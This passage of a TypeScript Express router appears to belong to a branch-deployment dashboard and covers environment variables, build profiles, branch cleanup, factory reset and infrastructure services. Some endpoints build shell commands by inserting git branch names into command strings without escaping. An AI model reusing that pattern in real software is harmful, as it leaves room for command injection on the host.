    // back to config.repoRoot via getProjectRepoRoot.
    const projectRepoRoot = stateService.getProjectRepoRoot(projectId, config.repoRoot);
    const adminDir = path.join(projectRepoRoot, 'prd-admin');
    const pm = fs.existsSync(adminDir) ? detectPackageManager(adminDir) : 'npm';
    const nodeCmd = nodeProfileCommands(pm);

    // Look up the project up-front — we need the slug both for the
    // suffix convention (Task 2) and for all downstream ID collisions.
    // getProject can't be undefined here because we already validated
    // projectId above, but TS still needs the narrow.
    const project = stateService.getProject(projectId);
    const projectSlug = project?.slug || projectId;

    // addBuildProfile guards on global id uniqueness — the legacy
    // project already owns "api" / "admin" so non-legacy projects
    // must suffix their ids. Suffix uses the project slug (human
    // readable, e.g. "api-prd-agent-2") instead of the first 8 hex
    // chars of the id, because slugs survive state.json migrations
    // while hex UUIDs look like random noise in the topology view.
    const idSuffix = projectId === 'default' ? '' : `-${projectSlug}`;

    // Task 1: prefer the project's own cds-compose.yaml over the
    // hardcoded template. This fixes the Redis-connect crash on forked
    // projects — the template was missing MongoDB/Redis/JWT env vars,
    // while cds-compose.yaml carries the full runtime contract.
    let composeYaml: string | null = null;
    for (const filename of ['cds-compose.yaml', 'cds-compose.yml']) {
      const composePath = path.join(projectRepoRoot, filename);
      if (fs.existsSync(composePath)) {
        try {
          composeYaml = fs.readFileSync(composePath, 'utf8');
          break;
        } catch {
          // Fall through to the next candidate / hardcoded template.
        }
      }
    }

    if (composeYaml) {
      const parsed = parseCdsCompose(composeYaml);
      if (parsed && parsed.buildProfiles.length > 0) {
        const seeded: BuildProfile[] = [];
        for (const bp of parsed.buildProfiles) {
          const profile: BuildProfile = {
            ...bp,
            id: `${bp.id}${idSuffix}`,
            projectId,
          };
          stateService.addBuildProfile(profile);
          seeded.push(profile);
        }

        // Merge envVars — never clobber user-authored vars. Since the
        // compose belongs to this project, seed values into the project
        // scope (so e.g. a JWT_SECRET from cds-compose.yaml doesn't leak
        // into sibling projects). Skip when either global OR project
        // already has the key — both are user-authored sources of truth.
        const mergedExisting = stateService.getCustomEnv(projectId);
        for (const [key, value] of Object.entries(parsed.envVars)) {
          if (mergedExisting[key] === undefined) {
            stateService.setCustomEnvVar(key, value, projectId);
          }
        }

        // Add infra services only when this project doesn't already
        // have one with the same id. Scope to projectId so two projects
        // can both declare their own `mongo` without colliding in the
        // global infraServices list.
        const existingInfra = stateService.getInfraServicesForProject(projectId);
        const existingInfraIds = new Set(existingInfra.map(s => s.id));
        for (const def of parsed.infraServices) {
          if (existingInfraIds.has(def.id)) continue;
          const service = composeDefToInfraService(def);
          service.projectId = projectId;
          stateService.addInfraService(service);
        }

        stateService.save();

        res.status(201).json({
          message: `快速启动: 已从 cds-compose.yaml 创建 ${seeded.length} 个构建配置`,
          profiles: seeded,
          detectedPackageManager: pm,
          source: 'cds-compose',
        });
        return;
      }
    }

    // Fallback: hardcoded template (pre-cds-compose.yaml projects).
    const defaults: BuildProfile[] = [
      {
        id: 'api',
        projectId,
        name: 'Backend API (.NET 8)',
        dockerImage: 'mcr.microsoft.com/dotnet/sdk:8.0',
        workDir: 'prd-api',
        command: 'dotnet restore && dotnet build --no-restore && dotnet run --no-build --project src/PrdAgent.Api/PrdAgent.Api.csproj --urls http://0.0.0.0:8080',
        containerPort: 8080,
        cacheMounts: [
          { hostPath: `${cacheBase}/nuget`, containerPath: '/root/.nuget/packages' },
        ],
      },
      {
        id: 'admin',
        projectId,
        name: 'Admin Panel (Vite)',
        dockerImage: 'node:20-slim',
        workDir: 'prd-admin',
        command: `${nodeCmd.installPrefix}${nodeCmd.runPrefix}vite --host 0.0.0.0 --port 5173`,
        containerPort: 5173,
        cacheMounts: nodeCmd.cacheMounts,
        // Wait for Vite to fully initialize (CSS/plugin pipeline ready) before routing traffic.
        // Without this, the proxy forwards requests while Vite is still starting, causing
        // CSS MIME type errors (Vite returns HTML fallback before transforms are ready).
        startupSignal: '➜  Network:',
      },
    ];

    for (const profile of defaults) {
      profile.id = `${profile.id}${idSuffix}`;
      stateService.addBuildProfile(profile);
    }
    stateService.save();

    res.status(201).json({
      message: `快速启动: 已创建 ${defaults.length} 个构建配置 (检测到包管理器: ${pm})`,
      profiles: defaults,
      detectedPackageManager: pm,
      source: 'template',
    });
  });

  // ── Custom environment variables (scoped: _global + per-project) ──
  //
  // Every endpoint accepts an optional `?scope=_global|<projectId>`
  // query. When omitted it defaults to `_global` so pre-feature
  // clients (that had no scope concept) keep working untouched.
  //
  // Only `_global` vars participate in syncCdsConfig() (rootDomains /
  // repoRoot etc. must be process-wide). Project-scoped vars go
  // straight into container env at deploy time.

  function resolveScope(req: import('express').Request): string {
    const raw = req.query.scope;
    const scope = typeof raw === 'string' ? raw.trim() : '';
    return scope || '_global';
  }

  router.get('/env', (req, res) => {
    const scope = resolveScope(req);
    // /env?scope=_all — give the Settings UI the full scoped map in one
    // round trip so it can render both global and per-project vars.
    if (scope === '_all') {
      res.json({ env: stateService.getCustomEnvRaw(), scope: '_all' });
      return;
    }
    res.json({ env: stateService.getCustomEnvScope(scope), scope });
  });

  // Helper: sync CDS-relevant env vars into runtime config.
  // Only reads _global — cross-project config can't be project-scoped.
  function syncCdsConfig() {
    const env = stateService.getCustomEnvScope('_global');
    if (env.ROOT_DOMAINS) config.rootDomains = env.ROOT_DOMAINS.split(',').map(v => v.trim()).filter(Boolean);
    if (env.SWITCH_DOMAIN) config.switchDomain = env.SWITCH_DOMAIN;
    if (env.MAIN_DOMAIN) config.mainDomain = env.MAIN_DOMAIN;
    if (env.DASHBOARD_DOMAIN) config.dashboardDomain = env.DASHBOARD_DOMAIN;
    if (env.PREVIEW_DOMAIN) config.previewDomain = env.PREVIEW_DOMAIN;
    if (config.rootDomains?.length) {
      if (!env.MAIN_DOMAIN) config.mainDomain = config.rootDomains[0];
      if (!env.DASHBOARD_DOMAIN) config.dashboardDomain = config.rootDomains[0];
      if (!env.PREVIEW_DOMAIN) config.previewDomain = config.rootDomains[0];
    }
    // Repo root & worktree base: allow UI override for directory isolation.
    // P4 Part 18 (G1.2): WorktreeService is now stateless, so we just
    // mutate config.repoRoot — call-sites read it via config or via
    // stateService.getProjectRepoRoot(projectId, config.repoRoot).
    if (env.CDS_REPO_ROOT) {
      config.repoRoot = env.CDS_REPO_ROOT;
    }
    if (env.CDS_WORKTREE_BASE) config.worktreeBase = env.CDS_WORKTREE_BASE;
  }

  router.put('/env', (req, res) => {
    const scope = resolveScope(req);
    if (scope === '_all') {
      res.status(400).json({ error: '_all 仅用于读取，写入请指定具体 scope' });
      return;
    }
    const env = req.body as Record<string, string>;
    if (!env || typeof env !== 'object') {
      res.status(400).json({ error: '请求体必须是键值对对象' });
      return;
    }
    stateService.setCustomEnv(env, scope);
    stateService.save();
    syncCdsConfig();
    res.json({ message: '环境变量已更新', env, scope });
  });

  router.put('/env/:key', (req, res) => {
    const { key } = req.params;
    const { value } = req.body as { value?: string };
    if (value === undefined) {
      res.status(400).json({ error: '值不能为空' });
      return;
    }
    const scope = resolveScope(req);
    if (scope === '_all') {
      res.status(400).json({ error: '_all 仅用于读取' });
      return;
    }
    stateService.setCustomEnvVar(key, value, scope);
    stateService.save();
    syncCdsConfig();
    res.json({ message: `Set ${key}`, scope });
  });

  router.delete('/env/:key', (req, res) => {
    const { key } = req.params;
    const scope = resolveScope(req);
    if (scope === '_all') {
      res.status(400).json({ error: '_all 仅用于读取' });
      return;
    }
    stateService.removeCustomEnvVar(key, scope);
    stateService.save();
    res.json({ message: `Deleted ${key}`, scope });
  });

  // ── Mirror acceleration ──

  router.get('/mirror', (_req, res) => {
    res.json({ enabled: stateService.isMirrorEnabled() });
  });

  router.put('/mirror', (req, res) => {
    const { enabled } = req.body as { enabled?: boolean };
    if (typeof enabled !== 'boolean') {
      res.status(400).json({ error: 'enabled 必须是布尔值' });
      return;
    }
    stateService.setMirrorEnabled(enabled);
    stateService.save();
    res.json({ message: enabled ? '镜像加速已开启' : '镜像加速已关闭', enabled });
  });

  // ── Tab title override ──

  router.get('/tab-title', (_req, res) => {
    res.json({ enabled: stateService.isTabTitleEnabled() });
  });

  router.put('/tab-title', (req, res) => {
    const { enabled } = req.body as { enabled?: boolean };
    if (typeof enabled !== 'boolean') {
      res.status(400).json({ error: 'enabled 必须是布尔值' });
      return;
    }
    stateService.setTabTitleEnabled(enabled);
    stateService.save();
    res.json({ message: enabled ? '标签页标题已开启' : '标签页标题已关闭', enabled });
  });

  // ── Preview mode (server-authoritative, shared across all users) ──

  router.get('/preview-mode', (_req, res) => {
    res.json({ mode: stateService.getPreviewMode() });
  });

  router.put('/preview-mode', (req, res) => {
    const { mode } = req.body as { mode?: string };
    if (mode !== 'simple' && mode !== 'port' && mode !== 'multi') {
      res.status(400).json({ error: "mode 必须是 'simple' | 'port' | 'multi'" });
      return;
    }
    stateService.setPreviewMode(mode);
    stateService.save();
    const labels: Record<string, string> = { simple: '简洁', port: '端口直连', multi: '子域名' };
    res.json({ message: `预览模式已切换为：${labels[mode]}`, mode });
  });

  // ── Config (read-only) ──

  router.get('/config', async (_req, res) => {
    const customEnv = stateService.getCustomEnv();

    // GitHub repo URL: prefer explicit config from UI env vars, fallback to git remote auto-detection
    let githubRepoUrl = customEnv.GITHUB_REPO_URL || '';
    if (!githubRepoUrl) {
      try {
        const result = await shell.exec('git remote get-url origin', { cwd: config.repoRoot, timeout: 5000 });
        const remote = result.stdout.trim();
        // Match patterns: git@github.com:owner/repo.git, https://github.com/owner/repo.git, or proxy /git/owner/repo
        const sshMatch = remote.match(/github\.com[:/]([^/]+\/[^/.]+)/);
        const httpMatch = remote.match(/github\.com\/([^/]+\/[^/.]+)/);
        const proxyMatch = remote.match(/\/git\/([^/]+\/[^/.]+)/);
        const match = sshMatch || httpMatch || proxyMatch;
        if (match) {
          githubRepoUrl = `https://github.com/${match[1].replace(/\.git$/, '')}`;
        }
      } catch { /* ignore */ }
    }

    // CDS git commit short hash for version identification
    let cdsCommitHash = '';
    try {
      const result = await shell.exec('git rev-parse --short HEAD', { cwd: config.repoRoot, timeout: 3000 });
      cdsCommitHash = result.stdout.trim();
    } catch { /* ignore */ }

    res.json({
      ...config,
      githubRepoUrl,
      cdsCommitHash,
      jwt: { ...config.jwt, secret: '***' },
      executorToken: config.executorToken ? '***' : undefined,
      sharedEnv: Object.fromEntries(
        Object.entries(config.sharedEnv).map(([k, v]) => [k, k.includes('PASSWORD') || k.includes('SECRET') ? '***' : v]),
      ),
      executors: Object.values(stateService.getExecutors()),
      previewMode: stateService.getPreviewMode(),
    });
  });

  // ── Check updates (compare local vs remote for all branches) ──

  router.get('/check-updates', async (_req, res) => {
    const state = stateService.getState();
    const branches = Object.values(state.branches);

    // Fetch latest remote refs once
    try {
      await shell.exec(
        'GIT_TERMINAL_PROMPT=0 git fetch origin --prune',
        { cwd: config.repoRoot, timeout: 30_000 },
      );
    } catch {
      // If fetch fails, we can still compare with last known remote state
    }

    const updates: Record<string, { behind: number; latestRemoteSubject?: string }> = {};

    await Promise.all(branches.map(async (b) => {
      try {
        // Count commits local is behind remote
        const behindResult = await shell.exec(
          `git rev-list --count HEAD..origin/${b.branch} 2>/dev/null || echo 0`,
          { cwd: b.worktreePath, timeout: 10_000 },
        );
        const behind = parseInt(behindResult.stdout.trim()) || 0;

        let latestRemoteSubject: string | undefined;
        if (behind > 0) {
          const subjectResult = await shell.exec(
            `git log -1 --format=%s origin/${b.branch}`,
            { cwd: b.worktreePath, timeout: 5_000 },
          );
          latestRemoteSubject = subjectResult.stdout.trim();
        }

        if (behind > 0) {
          updates[b.id] = { behind, latestRemoteSubject };
        }
      } catch {
        // Branch may not have a remote tracking branch — skip
      }
    }));

    res.json({ updates });
  });

  // ── Cleanup all non-default branches ──

  // ── Cleanup cross-project service pollution ──
  //
  // During the pre-project-scoped era a branch's entry.services could
  // accidentally collect service records for profiles that belong to
  // OTHER projects (most often when a deploy iterated the global
  // buildProfiles list rather than project-scoped). After fixing the
  // root cause, these stale entries still sit in state.json and show
  // up in the dashboard as ghost chips.
  //
  // This endpoint walks every branch, cross-references its entry.services
  // against the set of profiles that actually belong to its projectId,
  // and drops any entry whose profile belongs to someone else. It also
  // best-effort stops the orphan container if any is running.
  //
  // Idempotent, safe to run multiple times. Returns a summary so the
  // operator can see what was trimmed.
  router.post('/cleanup-cross-project-services', async (_req, res) => {
    try {
      const allBranches = Object.values(stateService.getState().branches || {});
      const trimmed: Array<{ branchId: string; dropped: string[] }> = [];

      for (const entry of allBranches) {
        const ownProjectId = entry.projectId || 'default';
        const ownProfileIds = new Set(
          stateService.getBuildProfilesForProject(ownProjectId).map((p) => p.id),
        );
        const dropped: string[] = [];
        for (const profileId of Object.keys(entry.services || {})) {
          if (!ownProfileIds.has(profileId)) {
            // Best-effort stop the orphan container.
            const svc = entry.services[profileId];
            if (svc?.containerName) {
              try { await containerService.stop(svc.containerName); } catch { /* already gone */ }
            }
            delete entry.services[profileId];
            dropped.push(profileId);
          }
        }
        if (dropped.length > 0) {
          trimmed.push({ branchId: entry.id, dropped });
        }
      }
      if (trimmed.length > 0) stateService.save();

      res.json({
        trimmedCount: trimmed.reduce((a, t) => a + t.dropped.length, 0),
        branches: trimmed,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/cleanup', async (req, res) => {
    initSSE(res);
    try {
      // Optional ?project=<id> scopes the cleanup to one project's
      // branches. Without the filter, all non-default branches across
      // every project are removed (pre-feature global behaviour).
      const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;

      const state = stateService.getState();
      const toRemove = Object.values(state.branches).filter((b) => {
        if (b.id === state.defaultBranch) return false;
        if (projectFilter && (b.projectId || 'default') !== projectFilter) return false;
        return true;
      });
      for (const entry of toRemove) {
        sendSSE(res, 'step', { step: 'cleanup', status: 'running', title: `正在删除 ${entry.id}...` });
        for (const svc of Object.values(entry.services)) {
          try { await containerService.stop(svc.containerName); } catch { /* ok */ }
        }
        try {
          const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
          await worktreeService.remove(repoRoot, entry.worktreePath);
        } catch { /* ok */ }
        stateService.removeLogs(entry.id);
        stateService.removeBranch(entry.id);
        sendSSE(res, 'step', { step: 'cleanup', status: 'done', title: `已删除 ${entry.id}` });
      }
      stateService.save();
      const msg = projectFilter
        ? `已清理项目 ${projectFilter} 的 ${toRemove.length} 个分支`
        : `已清理 ${toRemove.length} 个分支`;
      sendSSE(res, 'complete', { message: msg, removedCount: toRemove.length, scope: projectFilter || '_all' });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Cleanup orphan branches: remove local branches that no longer exist on remote ──

  router.post('/cleanup-orphans', async (req, res) => {
    initSSE(res);
    try {
      // Optional ?project=<id> filter — when the Dashboard is on a
      // specific project page, we only scan/clean that project's
      // branches. Without the filter we fan out to every project so
      // a global "cleanup orphans" from the top-level still works.
      const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;

      const projects = projectFilter
        ? [stateService.getProject(projectFilter)].filter(Boolean) as ReturnType<typeof stateService.getProjects>
        : stateService.getProjects();

      if (projects.length === 0) {
        sendSSE(res, 'complete', { message: projectFilter ? `未知项目: ${projectFilter}` : '没有项目', orphanCount: 0 });
        res.end();
        return;
      }

      // Per-project: resolve repoRoot, fetch remote, intersect with that
      // project's branch entries. Legacy projects without a custom
      // repoPath fall back to config.repoRoot via getProjectRepoRoot.
      // A project whose clone isn't ready (cloneStatus !== 'ready')
      // is skipped — it has no remote to check against.
      const allOrphans: BranchEntry[] = [];
      for (const project of projects) {
        if (project.cloneStatus && project.cloneStatus !== 'ready') {
          sendSSE(res, 'step', { step: `skip-${project.id}`, status: 'info', title: `跳过项目 ${project.name}（clone 未就绪）` });
          continue;
        }
        const projectRepoRoot = stateService.getProjectRepoRoot(project.id, config.repoRoot);
        sendSSE(res, 'step', { step: `fetch-${project.id}`, status: 'running', title: `拉取 ${project.name} 的远程分支...` });
        try {
          await shell.exec(
            'GIT_TERMINAL_PROMPT=0 git fetch origin --prune',
            { cwd: projectRepoRoot, timeout: 30_000 },
          );
        } catch (err) {
          sendSSE(res, 'step', { step: `fetch-${project.id}`, status: 'error', title: `${project.name} fetch 失败: ${(err as Error).message}` });
          continue;
        }
        const result = await shell.exec(
          'git for-each-ref --format="%(refname:lstrip=3)" refs/remotes/origin',
          { cwd: projectRepoRoot },
        );
        const remoteBranches = new Set(
          result.stdout.trim().split('\n').filter(Boolean).filter(b => b !== 'HEAD'),
        );
        const projectBranches = stateService.getBranchesForProject(project.id);
        const projectOrphans = projectBranches.filter(b => !remoteBranches.has(b.branch));
        sendSSE(res, 'step', { step: `fetch-${project.id}`, status: 'done', title: `${project.name}: 远程 ${remoteBranches.size} 个分支, 本地 ${projectBranches.length} 个, 孤儿 ${projectOrphans.length} 个` });
        allOrphans.push(...projectOrphans);
      }

      const orphans = allOrphans;

      if (orphans.length === 0) {
        sendSSE(res, 'complete', { message: '没有发现孤儿分支，一切正常', orphanCount: 0 });
        res.end();
        return;
      }

      sendSSE(res, 'step', { step: 'scan', status: 'info', title: `发现 ${orphans.length} 个孤儿分支`, detail: { orphans: orphans.map(b => ({ id: b.id, branch: b.branch })) } });

      // Step 3: stop containers + remove worktrees in parallel, then update state
      await Promise.all(orphans.map(async (entry) => {
        sendSSE(res, 'step', { step: `cleanup-${entry.id}`, status: 'running', title: `正在清理 ${entry.branch}...` });

        // Stop all containers for this orphan in parallel
        await Promise.all(
          Object.values(entry.services).map(svc =>
            containerService.stop(svc.containerName).catch(() => { /* ok */ }),
          ),
        );
        // Remove worktree
        try {
          const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
          await worktreeService.remove(repoRoot, entry.worktreePath);
        } catch { /* ok */ }

        sendSSE(res, 'step', { step: `cleanup-${entry.id}`, status: 'done', title: `已清理 ${entry.branch}` });
      }));

      // State mutations are serial (state is in-memory, no async needed)
      for (const entry of orphans) {
        stateService.removeLogs(entry.id);
        stateService.removeBranch(entry.id);
      }
      const cleaned = orphans.length;

      stateService.save();
      sendSSE(res, 'complete', { message: `已清理 ${cleaned} 个孤儿分支`, orphanCount: cleaned });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Prune stale local git branches not in CDS deployment list ──

  router.post('/prune-stale-branches', async (req, res) => {
    initSSE(res);
    try {
      // Optional ?project=<id> filter — same semantics as cleanup-orphans.
      // Without a filter we walk every project so state-level "prune
      // everything" still works. Each project has its own git repo and
      // its own list of deployed branches, so the protected set is
      // computed per-project.
      const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
      const projects = projectFilter
        ? [stateService.getProject(projectFilter)].filter(Boolean) as ReturnType<typeof stateService.getProjects>
        : stateService.getProjects();

      if (projects.length === 0) {
        sendSSE(res, 'complete', { message: projectFilter ? `未知项目: ${projectFilter}` : '没有项目', pruneCount: 0 });
        res.end();
        return;
      }

      let totalPruned = 0;
      for (const project of projects) {
        if (project.cloneStatus && project.cloneStatus !== 'ready') {
          sendSSE(res, 'step', { step: `skip-${project.id}`, status: 'info', title: `跳过项目 ${project.name}（clone 未就绪）` });
          continue;
        }
        const projectRepoRoot = stateService.getProjectRepoRoot(project.id, config.repoRoot);

        // What's "deployed" for this project = the branches we've
        // registered in CDS under this projectId. Cross-project
        // branches (e.g. default's 'main' when scanning prd-agent-2)
        // must NOT be considered deployed here, or we'd keep fork
        // branches named 'main' as stale just because default has one.
        const projectDeployed = new Set(
          stateService.getBranchesForProject(project.id).map(b => b.branch),
        );

        let currentBranch = '';
        try {
          const currentResult = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: projectRepoRoot });
          currentBranch = currentResult.stdout.trim();
        } catch {
          sendSSE(res, 'step', { step: `scan-${project.id}`, status: 'error', title: `${project.name}: 读 HEAD 失败` });
          continue;
        }
        const protectedBranches = new Set([currentBranch, 'main', 'master', 'develop', 'dev']);

        sendSSE(res, 'step', { step: `scan-${project.id}`, status: 'running', title: `扫描 ${project.name} 的本地分支...` });
        const localResult = await shell.exec('git branch --format="%(refname:short)"', { cwd: projectRepoRoot });
        const localBranches = localResult.stdout.trim().split('\n').filter(Boolean);
        const staleBranches = localBranches.filter(b =>
          !projectDeployed.has(b) && !protectedBranches.has(b),
        );
        sendSSE(res, 'step', {
          step: `scan-${project.id}`, status: 'done',
          title: `${project.name}: 本地 ${localBranches.length}, 已部署 ${projectDeployed.size}, 待清 ${staleBranches.length}`,
        });
        for (const branch of staleBranches) {
          sendSSE(res, 'step', { step: `del-${project.id}-${branch}`, status: 'running', title: `删除 ${project.name} / ${branch}...` });
          try {
            await shell.exec(`git branch -D "${branch}"`, { cwd: projectRepoRoot });
            totalPruned++;
            sendSSE(res, 'step', { step: `del-${project.id}-${branch}`, status: 'done', title: `已删除 ${project.name} / ${branch}` });
          } catch (err) {
            sendSSE(res, 'step', { step: `del-${project.id}-${branch}`, status: 'error', title: `删除失败 ${project.name} / ${branch}: ${(err as Error).message}` });
          }
        }
      }

      sendSSE(res, 'complete', { message: `已清理 ${totalPruned} 个非列表分支`, pruneCount: totalPruned });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Factory reset: stop all containers, clear all config, keep Docker volumes ──

  router.post('/factory-reset', async (req, res) => {
    initSSE(res);
    try {
      // Optional ?project=<id> scopes the reset to that project only:
      //   - stop/remove only that project's containers + worktrees
      //   - clear only that project's buildProfiles / infra / routing
      //   - clear only that project's customEnv bucket (_global untouched)
      //   - the Project entity itself stays (so the user doesn't have
      //     to recreate it + re-clone the repo)
      //
      // Without the filter, pre-feature behaviour applies: nuke EVERY
      // project's state and reset CDS to an empty-slate install.
      const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
      const state = stateService.getState();

      if (projectFilter) {
        const project = stateService.getProject(projectFilter);
        if (!project) {
          sendSSE(res, 'error', { message: `项目 ${projectFilter} 不存在` });
          res.end();
          return;
        }

        // 1. Stop + remove that project's branches
        const branches = Object.values(state.branches)
          .filter((b) => (b.projectId || 'default') === projectFilter);
        for (const entry of branches) {
          sendSSE(res, 'step', { step: 'reset', status: 'running', title: `停止分支 ${entry.id}...` });
          for (const svc of Object.values(entry.services)) {
            try { await containerService.stop(svc.containerName); } catch { /* ok */ }
          }
          try {
            const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
            await worktreeService.remove(repoRoot, entry.worktreePath);
          } catch { /* ok */ }
          stateService.removeLogs(entry.id);
          stateService.removeBranch(entry.id);
        }

        // 2. Stop + remove that project's infra containers (volumes preserved).
        //    We intentionally call getInfraServicesForProject before mutation
        //    and container operations so a partial failure still reports
        //    the right count.
        const infra = stateService.getInfraServicesForProject(projectFilter);
        for (const svc of infra) {
          sendSSE(res, 'step', { step: 'reset', status: 'running', title: `停止基础设施 ${svc.name}...` });
          try { await containerService.stop(svc.containerName); } catch { /* ok */ }
        }

        // 3. Remove this project's profiles / infra / routing / env bucket
        //    from state. Keep the Project entity + its dockerNetwork so
        //    the user doesn't have to recreate the project shell.
        //    getState() returns Readonly<CdsState>; cast away so we can
        //    replace the arrays in place (the same pattern as the
        //    global-reset branch below).
        const removedProfiles = stateService
          .getBuildProfilesForProject(projectFilter).length;
        const mutableState = state as unknown as {
          buildProfiles: BuildProfile[];
          infraServices: InfraService[];
          routingRules: RoutingRule[];
        };
        mutableState.buildProfiles = (state.buildProfiles || [])
          .filter((p) => (p.projectId || 'default') !== projectFilter);
        mutableState.infraServices = (state.infraServices || [])
          .filter((s) => (s.projectId || 'default') !== projectFilter);
        mutableState.routingRules = (state.routingRules || [])
          .filter((r) => (r.projectId || 'default') !== projectFilter);
        stateService.dropCustomEnvScope(projectFilter);
        stateService.save();

        sendSSE(res, 'complete', {
          message: `项目 ${project.name} 已重置：清除 ${branches.length} 个分支、${infra.length} 个基础设施、${removedProfiles} 个构建配置、环境变量作用域。项目实体 + Docker 数据卷保留。`,
          scope: projectFilter,
          removedBranches: branches.length,
          removedInfra: infra.length,
          removedProfiles,
        });
        return;
      }

      // ── Global factory-reset (all projects) — pre-feature path ──

      // 1. Stop and remove all branch containers + worktrees
      const branches = Object.values(state.branches);
      for (const entry of branches) {
        sendSSE(res, 'step', { step: 'reset', status: 'running', title: `停止分支 ${entry.id}...` });
        for (const svc of Object.values(entry.services)) {
          try { await containerService.stop(svc.containerName); } catch { /* ok */ }
        }
        try {
          const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
          await worktreeService.remove(repoRoot, entry.worktreePath);
        } catch { /* ok */ }
      }

      // 2. Stop and remove all infra service containers (volumes preserved)
      for (const svc of state.infraServices) {
        sendSSE(res, 'step', { step: 'reset', status: 'running', title: `停止基础设施 ${svc.name}...` });
        try { await containerService.stop(svc.containerName); } catch { /* ok */ }
      }

      // 3. Clear all state (but keep the file — it will be overwritten with defaults)
      const freshState: typeof state = {
        routingRules: [],
        buildProfiles: [],
        branches: {},
        nextPortIndex: 0,
        logs: {},
        defaultBranch: null,
        customEnv: { _global: {} },
        infraServices: [],
      };
      Object.assign(state, freshState);
      stateService.save();

      sendSSE(res, 'complete', {
        message: `已恢复出厂设置：清除 ${branches.length} 个分支、${state.infraServices.length} 个基础设施服务、所有配置。Docker 数据卷已保留。`,
      });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Compose-based infrastructure service discovery ──

  /** Convert a ComposeServiceDef to an InfraService (allocating a host port) */
  function composeDefToInfraService(def: ComposeServiceDef): InfraService {
    const hostPort = stateService.allocatePort(config.portStart);
    return {
      id: def.id,
      name: def.name,
      dockerImage: def.dockerImage,
      containerPort: def.containerPort,
      hostPort,
      containerName: `cds-infra-${def.id}`,
      status: 'stopped',
      volumes: [...def.volumes],
      env: { ...def.env },
      healthCheck: def.healthCheck ? { ...def.healthCheck } : undefined,
      createdAt: new Date().toISOString(),
    };
  }

  // ── Infrastructure services CRUD ──

  router.get('/infra', async (req, res) => {
    // P4 Part 3b: optional ?project=<id> filter.
    const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
    const services = projectFilter
      ? stateService.getInfraServicesForProject(projectFilter)
      : stateService.getInfraServices();

    // Reconcile status with Docker
    for (const svc of services) {
      if (svc.status === 'running') {
        const running = await containerService.isRunning(svc.containerName);
        if (!running) {
          svc.status = 'stopped';
        }
      }
    }
    stateService.save();

    res.json({ services });
  });

  // Discover infrastructure services from compose files in the repo
  router.get('/infra/discover', (_req, res) => {
    try {
      const composeFiles = discoverComposeFiles(config.repoRoot);
      const discovered: { file: string; services: ComposeServiceDef[] }[] = [];

      for (const file of composeFiles) {
        try {
          const services = parseComposeFile(file);
          if (services.length > 0) {
            discovered.push({ file: path.relative(config.repoRoot, file), services });
          }
        } catch { /* skip unparseable files */ }
      }

      res.json({ discovered });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  /**
   * Resolve the project context for /infra/:id routes.
   *
   * Reads ?project=<id> from the query string first. If absent, and the
   * global lookup of `id` yields exactly one match, uses that match's
   * projectId (back-compat for clients that don't know about projects).
   * If the global lookup yields multiple matches across projects,
   * returns null so the caller can 400 with a clear "which project?"
   * message instead of silently operating on the wrong one.
   */
  function resolveInfraProject(req: Request, id: string): { projectId: string } | { ambiguous: string[] } | null {
    const q = typeof req.query.project === 'string' ? req.query.project : null;
    if (q) return { projectId: q };
    const all = stateService.getInfraServices().filter(s => s.id === id);
    if (all.length === 0) return null;
    if (all.length === 1) return { projectId: all[0].projectId || 'default' };
    return { ambiguous: all.map(s => s.projectId || 'default') };
  }

  router.post('/infra', async (req, res) => {
    try {
      const body = req.body as Partial<InfraService>;

      if (!body.id || !body.dockerImage || !body.containerPort) {
        res.status(400).json({ error: 'id、Docker 镜像和容器端口为必填项' });
        return;
      }
      const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
      const projectId = body.projectId || queryProject || 'default';
      const targetProject = stateService.getProject(projectId);
      if (!targetProject) {
        res.status(400).json({ error: `未知项目: ${projectId}` });
        return;
      }
      {
        const m = assertProjectAccess(req as any, projectId);
        if (m) { res.status(m.status).json(m.body); return; }
      }
      const hostPort = stateService.allocatePort(config.portStart);
      // Container name must be globally unique in Docker. Legacy project
      // keeps the bare `cds-infra-<id>` format for back-compat (existing
      // running containers match). Non-legacy projects get the project
      // slug head prefixed so two projects can each own `mongodb`.
      const containerName = targetProject.legacyFlag
        ? `cds-infra-${body.id}`
        : `cds-infra-${targetProject.slug.slice(0, 12)}-${body.id}`;
      const service: InfraService = {
        id: body.id,
        projectId,
        name: body.name || body.id,
        dockerImage: body.dockerImage,
        containerPort: body.containerPort,
        hostPort,
        containerName,
        status: 'stopped',
        volumes: body.volumes || [],
        env: body.env || {},
        healthCheck: body.healthCheck,
        createdAt: new Date().toISOString(),
      };

      stateService.addInfraService(service);
      stateService.save();

      res.status(201).json({ service });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.put('/infra/:id', (req, res) => {
    try {
      const updates = req.body as Partial<InfraService>;
      const resolved = resolveInfraProject(req, req.params.id);
      if (!resolved) { res.status(404).json({ error: `基础设施服务 "${req.params.id}" 不存在` }); return; }
      if ('ambiguous' in resolved) {
        res.status(400).json({ error: `基础设施服务 "${req.params.id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
        return;
      }
      {
        const m = assertProjectAccess(req as any, resolved.projectId);
        if (m) { res.status(m.status).json(m.body); return; }
      }
      stateService.updateInfraService(req.params.id, updates, resolved.projectId);
      stateService.save();
      res.json({ message: '已更新' });
    } catch (err) {
